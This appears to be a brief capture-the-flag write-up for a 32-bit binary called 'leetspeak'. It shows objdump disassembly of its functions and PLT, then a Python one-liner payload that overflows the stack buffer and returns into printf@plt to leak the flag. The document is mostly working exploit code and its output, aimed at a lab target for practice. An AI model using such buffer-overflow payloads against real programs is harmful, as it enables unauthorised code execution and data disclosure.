# leetspeak

```bash=
$ objdump -d -M intel ./leetspeak | grep func
08048476 <func>:
 80484df:	e8 92 ff ff ff       	call   8048476 <func>
$ ./leetspeak 
key address: 0x804a040
^C
$ objdump -d -M intel -j .plt ./leetspeak

./leetspeak:     file format elf32-i386


Disassembly of section .plt:

08048310 <.plt>:
 8048310:	ff 35 04 a0 04 08    	push   DWORD PTR ds:0x804a004
 8048316:	ff 25 08 a0 04 08    	jmp    DWORD PTR ds:0x804a008
 804831c:	00 00                	add    BYTE PTR [eax],al
	...

08048320 <printf@plt>:
 8048320:	ff 25 0c a0 04 08    	jmp    DWORD PTR ds:0x804a00c
 8048326:	68 00 00 00 00       	push   0x0
 804832b:	e9 e0 ff ff ff       	jmp    8048310 <.plt>

08048330 <fgets@plt>:
 8048330:	ff 25 10 a0 04 08    	jmp    DWORD PTR ds:0x804a010
 8048336:	68 08 00 00 00       	push   0x8
 804833b:	e9 d0 ff ff ff       	jmp    8048310 <.plt>

08048340 <__libc_start_main@plt>:
 8048340:	ff 25 14 a0 04 08    	jmp    DWORD PTR ds:0x804a014
 8048346:	68 10 00 00 00       	push   0x10
 804834b:	e9 c0 ff ff ff       	jmp    8048310 <.plt>
$ python -c 'import sys;sys.stdout.buffer.write(b"A"*44 + b"\x20\x83\x04\x08\xdf\x84\x04\x08\x40\xa0\x04\x08")' | ./leetspeak 
key address: 0x804a040
taskctf{d0_u_kn0w_13375p33k?}key address: 0x804a040
Segmentation fault (core dumped)
```